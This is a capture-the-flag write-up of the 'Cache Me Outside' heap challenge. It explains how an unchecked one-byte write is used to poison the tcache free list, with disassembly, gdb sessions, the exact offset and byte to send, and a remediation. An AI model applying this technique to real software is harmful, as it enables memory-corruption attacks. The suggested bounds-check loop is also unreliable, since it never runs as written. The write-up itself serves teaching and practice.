# Cache Me Outside

## Summary

This challenge provides a Linux CLI program with an arbitrary write that is exploited by writing into heap metadata. The exploit performs a tcache poisoning to modify the free list and control what pointer `malloc` returns.

**Artifacts:**
* chall/heapedit: vulnerable executable program provided by challenge authors
* chall/Makefile: makefile that shows how the program was compiled
* chall/libc.so.6: version of the C standard library used to create the executable
* solve.py: exploit script that performs a tcache poisoning

## Context

The `Cache Me Outisde` challenge authors provide a domain and port to connect to the
challenge. They also provide a copy of the compiled challenge binary
(`chall/heapedit`) and the source code used to produce the Makefile (`chall/Makefile`) and the version of libc (`chall/libc.so.6`) used to compile the binary. They did not provide the .c file used to create the executable. Thus, Ghidra was used to examine code for the binary. Note that when running locally, you will need a `flag.txt` file in the same directory the program is being run in.

`heapedit` is a 64-bit x86 Linux userspace program. It runs as a CLI program and
reads input from `stdin` and prints to `stdout`.

The program functions only to prompt the user to enter an address then a value, prints a staement, and then exits.

```
$ chall/heapedit
You may edit one byte in the program.
Address: 1
Value: 1
t help you: this is a random string.
```

The binary is dynamially compiled without some standard exploit mitigations applied:
position independent executable (PIE) settings are diabled and the program isn't stripped. However, stack canaries are enabled and the stack is not executable.

```
$ file chall/heapedit 
heapedit: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=6967c296c25feb50c480b4edb5c56c234bb30392, not stripped

$ checksec chall/heapedit
[*] '/home/aw3515-picoctf/cache/heapedit'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    RUNPATH:    b'./'
    Stripped:   No
```

## Vulnerability

The `heapedit` program contains e vulnerability in the `main` function which allows an attacker to write an arbitrary byte to memory within the processe's memory space using an unbounded offset from a base pointer.

```
undefined8 main(void)

{
  long in_FS_OFFSET;
  char local_a9;
  int local_a8;
  int local_a4;
  char *local_a0;
  char *local_98;
  FILE *local_90;
  char *local_88;
  void *local_80;
  char local_78 [32];
  char local_58 [72];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setbuf(stdout,(char *)0x0);
  local_90 = fopen("flag.txt","r");
  fgets(local_58,0x40,local_90);
  builtin_strncpy(local_78,"this is a random string.",0x19);
  local_a0 = (char *)0x0;
  for (local_a4 = 0; local_a4 < 7; local_a4 = local_a4 + 1) {
    local_98 = (char *)malloc(0x80);
    if (local_a0 == (char *)0x0) {
      local_a0 = local_98;
    }
    builtin_strncpy(local_98,"Congrats! Your flag is: ",0x19);
    strcat(local_98,local_58);
  }
  local_88 = (char *)malloc(0x80);
  builtin_strncpy(local_88,"Sorry! This won\'t help you: ",0x1d);
  strcat(local_88,local_78);
  free(local_98);
  free(local_88);
  local_a8 = 0;
  local_a9 = '\0';
  puts("You may edit one byte in the program.");
  printf("Address: ");
  __isoc99_scanf(&DAT_00400b48,&local_a8);
  printf("Value: ");
  __isoc99_scanf(&DAT_00400b53,&local_a9);
  local_a0[local_a8] = local_a9;
  local_80 = malloc(0x80);
  puts((char *)((long)local_80 + 0x10));
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

Specifically, the problematic line lies in ` local_a0[local_a8] = local_a9` which allows an attacker to write a single byte `local_a9` to anywhere in memory using an offset `local_a8` from a base pointer `local_a0`. This offset goes unchecked and can be positive or negative and as large or small as the attacker needs it to be. For this exploit, it allows us to write into the heap and control heap metadata, specifically the tcache. 

The tcache (thread-cache) is a per-thread free list where recently freed chunks get placed in a bin based on their size, as each bin holds chunks of specific size ranges. When there is a call to `malloc`, it will first search through the tcache as an optimization. Any calls to `malloc` with the same size of a recently freed chunk placed on the tcache can quickly find and remove the chumk from the tcache, reducing a lot of overhead.


## Exploitation

**Exploit overview**: the exploit uses an arbitrary byte overwrite to perform tcache poisoning, modifying the tcache freelist in order to control the address that malloc will return.

From the objdump, we can see the addresses of the two calls to `free()` in `main`:

```
$ objdump -d heapedit
<snip>
0000000000400807 <main>:
  400807:       55                      push   %rbp
  400808:       48 89 e5                mov    %rsp,%rbp
  40080b:       48 81 ec c0 00 00 00    sub    $0xc0,%rsp
  400812:       89 bd 4c ff ff ff       mov    %edi,-0xb4(%rbp)
  400818:       48 89 b5 40 ff ff ff    mov    %rsi,-0xc0(%rbp)
  40081f:       64 48 8b 04 25 28 00    mov    %fs:0x28,%rax
<snip>
...
<snip>
  4009a3:       e8 d8 fc ff ff          call   400680 <free@plt>
  4009a8:       48 8b 45 80             mov    -0x80(%rbp),%rax
  4009ac:       48 89 c7                mov    %rax,%rdi
  4009af:       e8 cc fc ff ff          call   400680 <free@plt>
  4009b4:       c7 85 60 ff ff ff 00    movl   $0x0,-0xa0(%rbp)
<snip>
...
<snip>
```
By setting breakpoints just after these two calls to `free()`, we can examine the `heap` and `tcache bin` contents: 
```
<snip>
(gdb) b *0x4009a8
Breakpoint 1 at 0x4009a8
(gdb) r
...
[#0] Id 1, Name: "heapedit", stopped 0x4009a8 in main (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────trace ────
[#0] 0x4009a8 → main()
(gdb) heap bins tcache
────────────────────────────────────────────────────────────── Tcachebins for thread 1 ──────────────────────────────────────────────
Tcachebins[idx=7, size=0x90, count=1] ← Chunk(addr=0x603800, size=0x90, flags=PREV_INUSE)
(gdb) x/s 0x603800 + 0x10
0x603810:     "lag is: "
```
At this point in the `gdb` session, we're at a breakpoint right after the very first free. By running `heap bins tcache`, we can see that the recently freed chunk has ended up in the tcache bin, and it's contents are the string which contains the flag. 

From here we continue on to set a breakpoint at the next `free` and continue:
```
(gdb) b *0x4009b4
Breakpoint 2 at 0x4009b4
(gdb) c
(gdb) heap bins tcache
────────────────────────────────────────────────────────────── Tcachebins for thread 1 ──────────────────────────────────────────────
Tcachebins[idx=7, size=0x90, count=2] ←  Chunk(addr=0x603890, size=0x90, flags=PREV_INUSE)  ←  Chunk(addr=0x603800, size=0x90, flags=PREV_INUSE)
(gdb) x/s 0x603890 + 0x10
0x603900:     "t help you: this is a random string."
```
Now, at this point we're at the breakpoint right after the second `free`, and examining the tcache, there are now 2 chunks with the recently freed chunk at the head of the tcache bin. Examining the contents of the chunk, we can see that this recently freed chunk at the head of the list is what gets printed out at the end of the program. This means that in order for the program to instead print out the string containing the flag (which is the first freed chunk), we need the first freed chunk to end up at the head of the tcache bin. 

Currently, the tcache bin the chunks that fall into this range looks like this:
```
[tcache bin head] --> [chunk @ 0x603890] --> [chunk @ 0x603800]
```
With only one single byte that we can modify, we want the tcache bin to look like this:
```
[tcache bin head] --> [chunk @ 0x603800] 
```
Because a call to `malloc` with a size that fits the chunks in the tcache bin will return the first chunk at the head of the list, if we can get the tcache bin head to reference the chunk at address 0x603800, then this chunk will be returned. The key lines in `main` are here:
```
local_a0[local_a8] = local_a9;
local_80 = malloc(0x80);
```
where the first line will allow us to modify one byte, which is where we modify the tcache bin head and the second line is when the chunk containing the flag gets returned by `malloc` after we nodify the head. In order for this to happen we need to find where the tcache bin head is. We can do this using `search-pattern`:

```
(gdb) search-pattern 0x603890
<snip>
[+] Searching '\x90\x38\x60' in memory
[+] In '[heap]'(0x602000-0x623000), permission=rw-
  0x602088 - 0x602094  →   "\x90\x38\x60[...]"
<snip>
```
From the output, we can see that `0x602088` is the address that is holding first chunk of the list. We now need it to hold the memory address `0x603800`instead of `0x603890`. In order to do this we need to calculate the offset of `local_a0` to `0x602088`. By examining register contents using `gdb`, we find that `local_a0 = 0x6034a0`. Then, `0x6034a0 - 0x602088 = 5114`. This means that from `local_a0`, we need to subtract 5114, and at this address, we need to change the byte `0x90` to `0x00`. Thus, the address we send is `-5114` and the value we send is `\x00` so that `0x602088` goes from `\x90\x38\x60` to `\x00\x38\x60`.

Note that when using `gdb` I used the
[gef](https://github.com/hugsy/gef) extension, which allows for more visuals and commands.

**Exploit primitives used**:
1. Get to the tcache bin head using pointer arithmetic and offsets
2. Overwrite the tcache bin contents to point to a different chunk

## Remediation

To patch the vulnerability, the arbitrary write should be removed by validating user input. Specifically, the program should ensure that local_a8 remains within valid bounds. In this case checking that `local_a8` is positvie and within the allocated buffer's size would prevent writes outside the intended memory region.

it could look something likes this:

```
local_a8 = 0;
while (local_a8 < 0 || local_a8 > 0x80) {/*bounded check*/
    printf("Address: ");
    __isoc99_scanf(&DAT_00400b48,&local_a8);
}
```

Compiling the program with standard exploit mitigations would make the
vulnerability more difficult to exploit:
* PIE would prevent the use of program instructions as ROP gadgets.
* stripping the program would have made the program harder to reverse engineer
